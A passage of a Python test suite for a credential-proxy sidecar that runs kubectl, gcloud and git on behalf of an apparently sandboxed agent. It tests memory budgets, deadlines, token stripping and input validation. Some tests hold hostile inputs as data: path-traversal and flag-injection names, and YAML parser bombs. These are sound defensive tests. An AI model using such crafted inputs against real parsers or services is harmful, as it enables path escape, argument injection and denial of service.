        self.hold_a_slot(executor, seconds=2)
        waiter = threading.Thread(target=self.wait_for_a_slot, args=(executor,))
        waiter.start()
        self.addCleanup(waiter.join)
        deadline = time.monotonic() + 5
        while executor.queued_requests < 1:
            if time.monotonic() > deadline:
                self.fail("the slot taker never joined the queue")
            time.sleep(0.01)
        started = time.monotonic()
        with executor.reserve_child_memory():
            self.assertTrue(getattr(executor._request_budget, "reserved", False))
            self.assertEqual(1, executor.queued_requests)
            self.assertEqual(0, executor.reserved_bytes)
        self.assertLess(time.monotonic() - started, 0.5)
        self.assertFalse(getattr(executor._request_budget, "reserved", False))

    def test_a_request_too_large_for_an_empty_budget_is_admitted_with_one_warning(self):
        # The degenerate case (§2.3): a budget so small that nothing fits must
        # not refuse every command forever. A limit that small is under the
        # floor and disables the budget at construction, so this branch is
        # defensive, reachable only if the fixed terms or the cost move at
        # runtime; the test lowers the budget after construction to reach it.
        executor = self.budgeted(admits=2)
        executor.children_budget_bytes = executor._request_cost_bytes(takes_slot=True) - 1
        self.assertEqual(0, executor.requests_the_budget_admits())
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            with executor.request_slot():
                pass
            with executor.request_slot():
                pass
        warnings = [line for line in logs.output if "exceeds the child memory budget" in line]
        self.assertEqual(1, len(warnings), logs.output)

    def test_a_slot_less_reservation_joins_the_same_queue(self):
        # The forge refresh route reserves without a slot (§2.1); it waits in
        # arrival order behind slot takers, except past those that only the
        # full slot cap holds, and is released with the block.
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=1)
        started = time.monotonic()
        with executor.reserve_child_memory():
            self.assertTrue(getattr(executor._request_budget, "reserved", False))
            self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
            self.assertEqual(0, executor.slots_in_use)
            waited = time.monotonic() - started
        self.assertGreaterEqual(waited, 0.5)
        self.assertEqual(0, executor.reserved_bytes)
        self.assertFalse(getattr(executor._request_budget, "reserved", False))

    def test_a_reservation_is_released_when_the_block_raises(self):
        executor = self.budgeted(admits=1)
        with self.assertRaises(RuntimeError):
            with executor.request_slot():
                raise RuntimeError("the command blew up")
        self.assertEqual(0, executor.reserved_bytes)
        self.assertEqual(0, executor.slots_in_use)

    def test_a_caller_that_hangs_up_while_queued_for_the_budget_is_dropped(self):
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=3)
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)

        def hang_up():
            time.sleep(0.3)
            theirs.close()

        threading.Thread(target=hang_up, daemon=True).start()
        started = time.monotonic()
        with self.assertRaises(credential_proxy.CallerHungUp):
            with executor.request_slot(caller=ours):
                self.fail("admitted a caller that had hung up")

        # Back before the reservation would have freed, holding nothing.
        self.assertLess(time.monotonic() - started, 2.5)
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
        self.assertEqual(1, executor.slots_in_use)

    def test_an_emptied_group_gets_no_sigkill(self):
        # Once the group is seen empty its id is free for reuse, so the second
        # signal goes only to a group the grace ran out on. The sleep replaces
        # the shell so that the group empties on SIGTERM wherever the test
        # runs: a sleep forked under the shell is reparented at the kill, and
        # under a PID 1 that does not reap it stays a zombie in the group
        # through the whole grace, and the SIGKILL this test says must not be
        # sent is sent.
        sent = []
        real_killpg = os.killpg

        def recording(pgid, signum):
            sent.append(signum)
            return real_killpg(pgid, signum)

        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body="exec sleep 10",
        )
        with mock.patch("credential_proxy.os.killpg", recording):
            result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        self.assertIn(credential_proxy.signal.SIGTERM, sent)
        self.assertNotIn(credential_proxy.signal.SIGKILL, sent)

    def test_the_kubeconfig_cache_fill_runs_on_the_short_deadline(self):
        # Two silent gcloud calls ahead of the kubectl, inside one request:
        # on the broker-wide deadline they alone could outlast the idle time
        # Envoy allows the stream.
        executor = self.fake_gcloud(self.executor(kubectl_timeout_seconds=7))
        target = credential_proxy.parse_gke_context(self.CONTEXT)
        seen = []
        original = executor._execute

        def record(argv, **kwargs):
            seen.append(kwargs.get("timeout_seconds"))
            return original(argv, **kwargs)

        with mock.patch.object(executor, "_execute", record):
            executor._ensure_managed_kubeconfig(target)

        self.assertTrue(seen, "no gcloud ran for the cache fill")
        self.assertEqual({7}, set(seen))

    def test_a_request_s_commands_share_one_deadline(self):
        # Several commands in one request -- a vcs publish's git, a first
        # kubectl's credential fetch -- must not each get the whole broker
        # deadline, or the request's silent worst case is that many deadlines
        # end to end. The first command here spends most of a 2 s budget; the
        # second gets only what is left.
        executor = self.executor(timeout_seconds=2)

        started = time.monotonic()
        with executor.request_slot():
            first = executor.execute_internal(["/bin/sleep", "1.2"])
            second = executor.execute_internal(["/bin/sleep", "5"])
        elapsed = time.monotonic() - started

        self.assertFalse(first.timed_out)
        self.assertTrue(second.timed_out)
        self.assertEqual(124, second.exit_code)
        self.assertLess(elapsed, 5)
        # Outside a request, a command gets the deadline it asked for.
        self.assertFalse(executor.execute_internal(["/bin/sleep", "0.1"]).timed_out)

    def test_commands_take_no_slot_of_their_own(self):
        # A slot is a request's, held by the route around the command and the
        # response; a command never queues on its own. So the kubeconfig
        # cache-fill under `_kubeconfig_lock`, a trusted helper and the
        # workspace's git all run inside whatever slot their request holds,
        # and none of them can hold a lock while waiting for one.
        executor = self.executor(max_concurrent_commands=1)
        self.hold_a_slot(executor, seconds=2)

        started = time.monotonic()
        result = executor.execute_internal(["/bin/echo", "now"])

        self.assertEqual("now\n", result.stdout)
        self.assertLess(time.monotonic() - started, 1.0)

    # ---- Where a spawn is charged (design §2.1) ------------------------------

    def test_a_spawn_on_a_thread_with_no_reservation_takes_a_transient_one(self):
        # No shipped route reaches this branch once every route reserves at
        # its start; it exists so a new route that forgets to is throttled
        # rather than uncounted.
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=1)
        started = time.monotonic()
        result = executor.execute_internal(["/bin/echo", "now"])
        self.assertEqual("now\n", result.stdout)
        self.assertGreaterEqual(time.monotonic() - started, 0.5)
        self.assertEqual(0, executor.reserved_bytes)

    def test_commands_under_a_request_take_no_second_reservation(self):
        # A kubectl's cold-path gcloud, a vcs verb's several gits: one
        # reservation per request, held by the route, covers them all.
        executor = self.budgeted(admits=1)
        with executor.request_slot():
            self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
            with mock.patch.object(
                executor,
                "reserve_child_memory",
                side_effect=AssertionError("a second reservation was taken"),
            ):
                result = executor.execute_internal(["/bin/echo", "inside"])
            self.assertEqual("inside\n", result.stdout)
            self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)

    def test_the_content_workspace_git_reserves_nothing(self):
        # The store serves one verb at a time under its own lock; its one
        # process tree at a time is the fixed CONTENT_WORKSPACE_RESERVE_BYTES
        # term, subtracted whether or not a workspace is open, so its spawns
        # must neither wait for the budget nor count against it.
        with mock.patch.dict(os.environ, {"CREDENTIAL_PROXY_CONTENT_WORKSPACE": "1"}):
            executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=3)
        tree = executor.content_workspace_root / "t"
        tree.mkdir(parents=True)
        with mock.patch.object(
            executor,
            "reserve_child_memory",
            side_effect=AssertionError("the content workspace's git took a reservation"),
        ):
            result = executor.execute_workspace_git(["git", "check-ref-format", "refs/heads/main"], cwd=tree)
        self.assertEqual(0, result.exit_code, result.stderr)
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)

    def test_the_fixed_workspace_term_is_subtracted_with_no_workspace_open(self):
        mib = credential_proxy.MEBIBYTE
        executor = self.executor(memory_limit_bytes=1024 * mib)
        self.assertEqual((1024 - 192 - 128) * mib, executor.children_budget_bytes)

    def test_a_transient_reservation_is_released_after_a_timed_out_command(self):
        # Review focus 2.
        executor = self.budgeted(admits=1)
        result = executor._execute(["/bin/sleep", "5"], timeout_seconds=0.2)
        self.assertTrue(result.timed_out)
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_transient_reservation_is_released_when_popen_raises(self):
        executor = self.budgeted(admits=1)
        with self.assertRaises(FileNotFoundError):
            executor._execute(["/nonexistent/binary"])
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_caller_that_hangs_up_while_queued_for_a_transient_reservation_spawns_nothing(self):
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=2)
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)

        def hang_up():
            time.sleep(0.3)
            theirs.close()

        threading.Thread(target=hang_up, daemon=True).start()
        with mock.patch.object(credential_proxy.subprocess, "Popen", wraps=subprocess.Popen) as popen:
            with self.assertRaises(credential_proxy.CallerHungUp):
                executor._execute(["/bin/echo", "never"], caller=ours)
        popen.assert_not_called()
        # Still exactly the holder's reservation: the dropped caller took none.
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)

    # ---- Bounding a kubectl that cannot reach its control plane -------------

    def test_kubectl_read_is_given_a_request_timeout_and_the_short_deadline(self):
        # kubectl's own client default is 300s, so an unreachable control plane
        # holds a broker worker for five minutes without these two bounds.
        executor = self.fake_kubectl(self.executor())

        argv, deadline = self.dispatched(executor, ["kubectl", "get", "pods"])

        self.assertIn(
            f"--request-timeout={credential_proxy.DEFAULT_KUBECTL_REQUEST_TIMEOUT}", argv
        )
        self.assertEqual(executor.kubectl_timeout_seconds, deadline)

    def test_kubectl_keeps_the_request_timeout_its_caller_chose(self):
        # A caller who named a bound has answered the question; overriding it
        # with a shorter one would make the flag a lie.
        executor = self.fake_kubectl(self.executor())

        argv, deadline = self.dispatched(
            executor, ["kubectl", "get", "pods", "--request-timeout=5m"]
        )

        self.assertEqual(
            1, len([arg for arg in argv if arg.startswith("--request-timeout")])
        )
        self.assertIn("--request-timeout=5m", argv)
        self.assertIsNone(deadline)

    def test_kubectl_commands_that_are_meant_to_block_keep_the_broker_deadline(self):
        # `logs`, `wait` and `rollout status` are permitted by command_policy
        # and instructed by a shipped skill, so bounding them at 30s/60s does
        # not turn a hang into a fast failure, it turns a working command into
        # a broken one. The rest are refused a layer earlier today and are here
        # so the deadline stays right if that ever changes.
        executor = self.fake_kubectl(self.executor())
        blocking = (
            ["kubectl", "logs", "-f", "pod/api"],
            ["kubectl", "logs", "--follow", "pod/api"],
            ["kubectl", "get", "pods", "-w"],
            ["kubectl", "get", "pods", "--watch"],
            ["kubectl", "rollout", "status", "deployment/api"],
            ["kubectl", "wait", "--for=condition=Ready", "pod/api"],
            ["kubectl", "delete", "namespace", "scratch"],
            ["kubectl", "exec", "pod/api", "--", "true"],
            ["kubectl", "port-forward", "pod/api", "8080:80"],
            ["kubectl", "--namespace=demo", "wait", "--for=delete", "pod/api"],
            ["kubectl", "-n", "kube-system", "logs", "-f", "pod/api"],
            ["kubectl", "logs", "--follow=true", "pod/api"],
            ["kubectl", "get", "pods", "--watch=true"],
            ["kubectl", "get", "pods", "--watch-only=true"],
            ["kubectl", "-n", "demo", "rollout", "status", "deployment/api"],
            ["kubectl", "--namespace", "demo", "wait", "--for=condition=Ready", "pod/x"],
            ["kubectl", "--context", "foo", "wait", "--for=delete", "pod/api"],
        )

        for command in blocking:
            with self.subTest(command=" ".join(command)):
                argv, deadline = self.dispatched(executor, command)
                self.assertNotIn(
                    f"--request-timeout={credential_proxy.DEFAULT_KUBECTL_REQUEST_TIMEOUT}",
                    argv,
                )
                self.assertIsNone(deadline)

    def test_kubectl_detached_global_flag_does_not_exempt_ordinary_reads(self):
        executor = self.fake_kubectl(self.executor())
        argv, deadline = self.dispatched(
            executor, ["kubectl", "-n", "kube-system", "get", "pods"]
        )
        self.assertIn(
            f"--request-timeout={credential_proxy.DEFAULT_KUBECTL_REQUEST_TIMEOUT}",
            argv,
        )
        self.assertEqual(executor.kubectl_timeout_seconds, deadline)

    def test_kubectl_filename_flag_is_not_mistaken_for_logs_follow(self):
        # `-f` is `--filename` on every verb except `logs`. Reading it as "this
        # streams" would exempt most of the write path from the bound.
        executor = self.fake_kubectl(self.executor())

        argv, deadline = self.dispatched(
            executor, ["kubectl", "apply", "-f", "manifest.yaml"]
        )

        self.assertIn(
            f"--request-timeout={credential_proxy.DEFAULT_KUBECTL_REQUEST_TIMEOUT}", argv
        )
        self.assertEqual(executor.kubectl_timeout_seconds, deadline)

    def test_hanging_kubectl_read_is_killed_at_the_short_deadline(self):
        # The end-to-end shape of the fix: the broker-wide deadline is long, the
        # kubectl one is short, and a read that cannot answer takes the short one.
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body="sleep 10",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        self.assertEqual(124, result.exit_code)
        self.assertIn("kubectl command timed out after 1s", result.stderr)

    def test_blocking_kubectl_outlives_the_short_deadline(self):
        # The other side of the same knob: with the short deadline set to 1s, a
        # command that is meant to block still gets the broker-wide budget.
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body="sleep 2",
        )

        result = executor.execute(["kubectl", "wait", "--for=condition=Ready", "pod/api"])

        self.assertFalse(result.timed_out)
        self.assertEqual(0, result.exit_code)

    def test_command_environment_excludes_sidecar_tokens(self):
        import os

        previous = os.environ.get("SLACK_BOT_TOKEN")
        os.environ["SLACK_BOT_TOKEN"] = "must-not-be-forwarded"
        try:
            executor = self.executor()
        finally:
            if previous is None:
                del os.environ["SLACK_BOT_TOKEN"]
            else:
                os.environ["SLACK_BOT_TOKEN"] = previous
        self.assertNotIn("SLACK_BOT_TOKEN", executor.environment)
        self.assertEqual(str(Path(self.temp_dir.name) / "home"), executor.environment["HOME"])

    def test_kuberc_is_disabled_for_proxied_commands(self):
        # command_policy refuses the --kuberc flag, but kubectl v1.36.3 also
        # reads $HOME/.kube/kuberc with no flag present, and a kuberc can carry
        # an `as` default -- verified to set Impersonate-User on an argv holding
        # nothing to refuse. HOME points at the sidecar-only state dir, so the
        # agent cannot write that path today, but that is deployment geometry
        # and it is not what this asserts. This asserts the feature is off, so
        # the property survives someone rearranging the mounts.
        executor = self.executor()
        # .get rather than [] so removing the variable reads as a failure with
        # the expected value in the diff, not as a KeyError in the error column.
        self.assertEqual("false", executor.environment.get("KUBECTL_KUBERC"))
        # And the geometry, separately, so a change to either is visible.
        self.assertEqual(
            str(Path(self.temp_dir.name) / "home"), executor.environment["HOME"]
        )

    def test_git_commands_carry_a_commit_identity(self):
        # The remediation Pull Request path commits through the proxy, and the
        # commit runs here, in the sidecar. With no identity `git commit` exits
        # 128 before it writes anything, so all four variables have to be set.
        environment = self.git_environment(self.executor(max_output_bytes=1 << 16))
        self.assertEqual("kube-agents platform agent", environment["GIT_AUTHOR_NAME"])
        self.assertEqual("kube-agents platform agent", environment["GIT_COMMITTER_NAME"])
        self.assertEqual("platform-agent@kube-agents.invalid", environment["GIT_AUTHOR_EMAIL"])
        self.assertEqual("platform-agent@kube-agents.invalid", environment["GIT_COMMITTER_EMAIL"])

    def test_commit_identity_honours_the_operator_override(self):
        import os

        overrides = {
            "CREDENTIAL_PROXY_GIT_AUTHOR_NAME": "fleet-bot",
            "CREDENTIAL_PROXY_GIT_AUTHOR_EMAIL": "fleet-bot@example.invalid",
        }
        previous = {name: os.environ.get(name) for name in overrides}
        os.environ.update(overrides)
        try:
            executor = self.executor(max_output_bytes=1 << 16)
        finally:
            for name, value in previous.items():
                if value is None:
                    del os.environ[name]
                else:
                    os.environ[name] = value
        environment = self.git_environment(executor)
        self.assertEqual("fleet-bot", environment["GIT_AUTHOR_NAME"])
        self.assertEqual("fleet-bot", environment["GIT_COMMITTER_NAME"])
        self.assertEqual("fleet-bot@example.invalid", environment["GIT_AUTHOR_EMAIL"])
        self.assertEqual("fleet-bot@example.invalid", environment["GIT_COMMITTER_EMAIL"])

    def test_commit_identity_reaches_no_other_executable(self):
        # Scoped to git on purpose: nothing else needs it, and a variable that is
        # not there cannot be read by a command that had no business seeing it.
        executor = self.executor(max_output_bytes=1 << 16)
        environment = self.dumped_environment(
            executor.execute_internal(["/bin/bash", "-c", "env"])
        )
        for name in ("GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL"):
            self.assertNotIn(name, environment)

    def test_commit_identity_forwards_no_token(self):
        # The identity is the only thing git gains. Its credentials still come
        # from the sidecar's own store, so no bearer token may ride along.
        import os

        tokens = {
            "GITHUB_TOKEN": "must-not-be-forwarded-github",
            "GH_TOKEN": "must-not-be-forwarded-gh",
            "SLACK_BOT_TOKEN": "must-not-be-forwarded-slack",
        }
        previous = {name: os.environ.get(name) for name in tokens}
        os.environ.update(tokens)
        try:
            executor = self.executor(max_output_bytes=1 << 16)
        finally:
            for name, value in previous.items():
                if value is None:
                    del os.environ[name]
                else:
                    os.environ[name] = value
        environment = self.git_environment(executor)
        for name, value in tokens.items():
            self.assertNotIn(name, environment)
            self.assertNotIn(value, environment.values())

    def test_bootstrap_prepares_profile_for_later_commands(self):
        import os

        previous = os.environ.get("GKE_PROJECT_ID")
        os.environ["GKE_PROJECT_ID"] = "bootstrap-project"
        try:
            executor = self.executor()
            executor.bootstrap(
                'printf "%s" "$GKE_PROJECT_ID" > "$HOME/bootstrap-state"'
            )
        finally:
            if previous is None:
                del os.environ["GKE_PROJECT_ID"]
            else:
                os.environ["GKE_PROJECT_ID"] = previous
        self.assertTrue((Path(self.temp_dir.name) / "home" / "bootstrap-state").exists())
        self.assertEqual(
            "bootstrap-project",
            (Path(self.temp_dir.name) / "home" / "bootstrap-state").read_text(),
        )
        self.assertNotIn("GKE_PROJECT_ID", executor.environment)

    def test_bootstrap_failure_does_not_return_command_output(self):
        with self.assertRaisesRegex(RuntimeError, "exit code 9") as raised:
            self.executor().bootstrap("printf secret >&2; exit 9")
        self.assertNotIn("secret", str(raised.exception))

    def test_bootstrap_failure_logs_command_output(self):
        # The exception stays output-free, but an operator reading the sidecar's
        # own logs needs to see why the bootstrap failed.
        with self.assertLogs("credential-proxy", level="ERROR") as captured:
            with self.assertRaisesRegex(RuntimeError, "exit code 9"):
                self.executor().bootstrap(
                    "printf came-from-stdout; printf came-from-stderr >&2; exit 9"
                )
        logged = "\n".join(captured.output)
        self.assertIn("came-from-stdout", logged)
        self.assertIn("came-from-stderr", logged)
        self.assertIn("exit code 9", logged)


class GkeContextTest(unittest.TestCase):
    """`parse_gke_context` is the whole trust boundary for kubeconfig content.

    Everything downstream — which cluster gets re-fetched, and the filename the
    result is cached under — comes from what this returns, so anything it lets
    through has to be a real GKE triple and nothing else.
    """

    def test_recovers_the_triple(self):
        target = parse_gke_context("gke_demo-project_us-central1-a_cluster-a")
        self.assertEqual(("demo-project", "us-central1-a", "cluster-a"),
                         (target.project, target.location, target.cluster))

    def test_round_trips_the_context_name(self):
        # The proxy, the operator's buildCredentialProxyEnv, and the preflight all
        # spell this the same way; the cache filename depends on it.
        name = "gke_demo-project_us-central1_cluster-a"
        self.assertEqual(name, parse_gke_context(name).context_name)

    def test_rejects_names_that_are_not_gke_contexts(self):
        for context in ("minikube", "gke_only_three", "arn:aws:eks:us-east-1:1:cluster/x", ""):
            with self.subTest(context=context):
                self.assertIsNone(parse_gke_context(context))

    def test_rejects_components_that_would_escape_the_cache_directory(self):
        # The parsed values become a filename, so traversal and separators must
        # not survive the parse.
        for context in (
            "gke_..__.._etc",
            "gke_proj_loc_../../escape",
            "gke_proj_loc_has/slash",
            "gke_proj_loc_-leading-dash",
            "gke_proj_loc_Upper",
            "gke_proj_loc_has space",
        ):
            with self.subTest(context=context):
                self.assertIsNone(parse_gke_context(context))


class CurrentContextTest(unittest.TestCase):
    def test_reads_a_plain_value(self):
        self.assertEqual("gke_p_l_c", read_current_context("current-context: gke_p_l_c\n"))

    def test_reads_quoted_and_commented_forms(self):
        # gcloud has emitted both over time.
        self.assertEqual("gke_p_l_c", read_current_context('current-context: "gke_p_l_c"\n'))
        self.assertEqual("gke_p_l_c", read_current_context("current-context: 'gke_p_l_c'\n"))
        self.assertEqual("gke_p_l_c", read_current_context("current-context: gke_p_l_c # pinned\n"))

    def test_reads_the_spellings_only_a_real_parser_sees(self):
        # YAML is a JSON superset and a kubeconfig may legally use any of these.
        # A line scanner reads the block scalar's `>-` as the value and misses
        # the rest outright, which turns a valid pin into a rejected request.
        for label, document in (
            ("json", '{"current-context": "gke_p_l_c", "kind": "Config"}'),
            ("flow mapping", "{current-context: gke_p_l_c}"),
            ("block scalar", "current-context: >-\n  gke_p_l_c\n"),
            ("merge key", "base: &b {current-context: gke_p_l_c}\n<<: *b\n"),
        ):
            with self.subTest(label):
                self.assertEqual("gke_p_l_c", read_current_context(document))

    def test_reads_the_top_level_key_not_a_nested_one(self):
        document = (
            "contexts:\n"
            "- context:\n"
            "    current-context: gke_decoy_l_c\n"
            "current-context: gke_real_l_c\n"
        )
        self.assertEqual("gke_real_l_c", read_current_context(document))

    def test_returns_none_when_there_is_nothing_to_read(self):
        for label, document in (
            ("no such key", "apiVersion: v1\n"),
            ("null value", "current-context:\n"),
            ("empty value", "current-context: '' \n"),
            ("non-string value", "current-context: 17\n"),
            ("not a mapping", "- current-context: gke_p_l_c\n"),
            ("empty document", ""),
            ("syntax error", "current-context: [unterminated\n"),
            ("several documents", "current-context: gke_a_l_c\n---\ncurrent-context: gke_b_l_c\n"),
        ):
            with self.subTest(label):
                self.assertIsNone(read_current_context(document))

    def test_survives_a_document_built_to_kill_the_parser(self):
        # Both shapes are reachable: the caller's kubeconfig is agent-authored
        # and only bounded by MAX_KUBECONFIG_BYTES. Deep nesting is why the
        # loader must stay pure-Python — under yaml.CSafeLoader this segfaults
        # the sidecar rather than raising.
        self.assertIsNone(read_current_context("[" * 200_000 + "]" * 200_000))

        bomb = 'a: &a ["x","x","x","x","x","x","x","x","x"]\n'
        for index in range(1, 12):
            parent, child = chr(ord("a") + index), chr(ord("a") + index - 1)
            bomb += f"{parent}: &{parent} [" + ",".join([f"*{child}"] * 9) + "]\n"
        bomb += "current-context: gke_p_l_c\n"
        self.assertEqual("gke_p_l_c", read_current_context(bomb))


class RepositoryValidationTest(unittest.TestCase):
    def test_accepts_valid_owner_name(self):
        self.assertTrue(is_valid_repository("gke-labs/kube-agents"))
        self.assertTrue(is_valid_repository("Owner_1/repo.name-2"))

    def test_rejects_non_string(self):
        self.assertFalse(is_valid_repository(None))
        self.assertFalse(is_valid_repository(["owner/name"]))

    def test_rejects_missing_slash(self):
        self.assertFalse(is_valid_repository("owner-name"))

    def test_rejects_extra_slash_and_empty_segments(self):
        self.assertFalse(is_valid_repository("owner/name/extra"))
        self.assertFalse(is_valid_repository("/name"))
        self.assertFalse(is_valid_repository("owner/"))

    def test_rejects_oversized_input(self):
        # The length guard rejects unbounded untrusted input before the regex
        # runs (defense-in-depth against regex denial-of-service).
        self.assertFalse(is_valid_repository("-" * (MAX_REPOSITORY_LENGTH + 1)))

    def test_rejects_traversal_and_flag_segments(self):
        # The local validator this replaced accepted both; every other copy in
        # the tree rejected them. `acme/..` names the owner's namespace rather
        # than a repository, and a leading dash makes `gh -R <slug>` read the
        # slug as a flag.
        for value in ("acme/..", "acme/.", "acme/-x", "-acme/repo", "../.."):
            with self.subTest(value=value):
                self.assertFalse(is_valid_repository(value))

    def test_rejects_a_value_it_would_have_to_normalise(self):
        # The caller passes the *original* string to github_token_refresh.py,
        # which splits it on "/" and sends the left half to Minty as an org
        # name. Accepting a value that merely normalises to a slug would put
        # "  acme" in that request.
        for value in (
            " acme/repo ",
            "acme/repo\n",
            "/acme/repo",
            "acme/repo/",
            "acme/repo.git",
        ):
            with self.subTest(value=value):
                self.assertFalse(is_valid_repository(value))

    def test_rejects_a_value_carrying_a_host(self):
        for value in (
            "github.com/acme",
            "github.com/acme/repo",
            "https://github.com/acme/repo",
            "git@github.com:acme/repo",
        ):
            with self.subTest(value=value):
                self.assertFalse(is_valid_repository(value))

    def test_stays_total_on_a_malformed_url(self):
        # urlsplit raises a bare ValueError on these; nothing may escape a
        # predicate the request handler calls on untrusted input.
        for value in ("https://[::1/x", "http://[abc]:x/a/b", "https://a]b/c/d"):
            with self.subTest(value=value):
                self.assertFalse(is_valid_repository(value))


class ForgeRefreshExecutorTest(unittest.TestCase):
    """A failed refresh splits its diagnosis: detail to the log, none to the caller.

    The reply crosses back into the agent sandbox and the caller renders the
    resulting reason code into a chat room, so it stays output-free. The
    helper's stderr carries the broker's actual refusal and is the only thing
    an operator has to read, so it has to reach the sidecar's own log.

    The split lives on the executor rather than on the route because the route
    is not the only caller: a forge's credential strategy asks for the same
    operation in-process, and a diagnosis only the HTTP path logged would be
    absent for exactly the clone that failed.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        helpers = Path(self.temp_dir.name)
        (helpers / "github_token_refresh.py").write_text("#!/usr/bin/env python3\n")
        patch = mock.patch.object(
            credential_proxy, "FORGE_REFRESH_HELPER_DIR", str(helpers)
        )
        patch.start()
        self.addCleanup(patch.stop)

    def _refresh(self, result, provider="github"):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        executor.execute_internal = lambda argv: result
        # Reading the managed list needs the gitops-state ConfigMap. Answering
        # it here keeps these tests about what a failed refresh logs; the gate
        # itself is tested below.
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
                with self.assertRaises(RuntimeError) as raised:
                    executor.refresh_forge_credential(provider, "gke-agentic/infra")
        return str(raised.exception), logs.output

    @staticmethod
    def _failure(stderr):
        return credential_proxy.ExecutionResult(
            exit_code=1,
            stdout="",
            stderr=stderr,
            duration_ms=5,
            truncated=False,
            timed_out=False,
        )

    def test_logs_broker_refusal_but_keeps_it_out_of_what_it_raises(self):
        refusal = "Minty returned error (HTTP 403): installation not found"
        message, logs = self._refresh(self._failure(refusal + "\n"))

        self.assertIn(refusal, "\n".join(logs))
        self.assertEqual(message, "credential refresh failed")

    def test_truncates_oversized_stderr(self):
        # `_execute` bounds output at CREDENTIAL_PROXY_MAX_OUTPUT_BYTES, 4 MiB by
        # default, which is not a log line -- and this path runs on every failed
        # cron tick.
        # The tail: the helper names the failure on its last line, after the
        # steps that ran before it.
        _, logs = self._refresh(self._failure("x" * 5000 + "FATAL: why"))

        detail = logs[0].split("github credential refresh exited 1: ", 1)[1]
        self.assertEqual(1000, len(detail))
        self.assertTrue(detail.endswith("FATAL: why"))

    def test_omits_the_detail_when_stderr_is_empty(self):
        _, logs = self._refresh(self._failure("   \n"))

        self.assertTrue(logs[0].endswith("github credential refresh exited 1"))

    def test_a_successful_refresh_logs_what_the_helper_said_at_info(self):
        # The helper names the branch that minted the identity token and how
        # long it took; a refresh that fell through to gcloud and still
        # succeeded is visible only from this line.
        said = (
            "[SRE-AUTH] WARNING: no identity token from the metadata server (HTTP Error 404: Not Found after 0.01s); asking gcloud.\n"
            "[SRE-AUTH] Minted the broker OIDC token through gcloud in 1.20s.\n"
            "[SRE-AUTH] GitHub authentication successfully configured for repository: gke-agentic/infra\n"
        )
        executor = credential_proxy.CommandExecutor.__new__(credential_proxy.CommandExecutor)
        executor.execute_internal = lambda argv: credential_proxy.ExecutionResult(
            exit_code=0, stdout="", stderr=said, duration_ms=5, truncated=False, timed_out=False
        )
        with mock.patch.object(credential_proxy, "repository_is_managed", return_value=True):
            with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                executor.refresh_forge_credential("github", "gke-agentic/infra")
        line = [entry for entry in logs.output if "github credential refresh: " in entry]
        self.assertEqual(1, len(line), logs.output)
        self.assertIn("asking gcloud", line[0])
        self.assertIn("through gcloud in 1.20s", line[0])
        self.assertTrue(line[0].startswith("INFO:"))

    def test_a_successful_read_only_mint_logs_nothing(self):
        # One per clone of a context repository; only the refresh asks for the
        # success line.
        executor = credential_proxy.CommandExecutor.__new__(credential_proxy.CommandExecutor)
        executor.execute_internal = lambda argv: credential_proxy.ExecutionResult(
            exit_code=0, stdout="ghs_token", stderr="[SRE-AUTH] Minted a read-only installation token for repository: o/r\n", duration_ms=5, truncated=False, timed_out=False
        )
        with self.assertNoLogs(credential_proxy.LOGGER, level="INFO"):
            executor._run_forge_helper("github", Path(__file__), ["o/r", "--read-only"], "read-only credential mint")

    def test_redacts_token_shapes_out_of_the_detail(self):
        token = "ghs_" + "A" * 36
        _, logs = self._refresh(self._failure(f"HTTP 403 echoed {token} back"))

        self.assertNotIn(token, logs[0])
        self.assertIn("[REDACTED]", logs[0])

    def test_redacts_before_truncating(self):
        # Truncating first would slice a token in half and leave the prefix in
        # the log, where the shape no longer matches.
        token = "ghs_" + "B" * 36
        _, logs = self._refresh(self._failure("y" * 990 + token))

        self.assertNotIn("ghs_", logs[0])
        self.assertNotIn("B" * 20, logs[0])

    def test_an_unmanaged_repository_never_reaches_the_helper(self):
        executor = credential_proxy.CommandExecutor.__new__(
            credential_proxy.CommandExecutor
        )
        calls = []
        executor.execute_internal = lambda argv: calls.append(argv)
        with mock.patch.object(
            credential_proxy, "repository_is_managed", return_value=False
        ):
            with self.assertRaises(PermissionError):
                executor.refresh_forge_credential("github", "someone-else/infra")
        self.assertEqual(calls, [])

    def test_a_provider_name_cannot_reach_out_of_the_helper_directory(self):
        # The provider comes from a forge class today rather than from a
        # request. The grammar is what keeps that true if a route ever passes
        # one through.
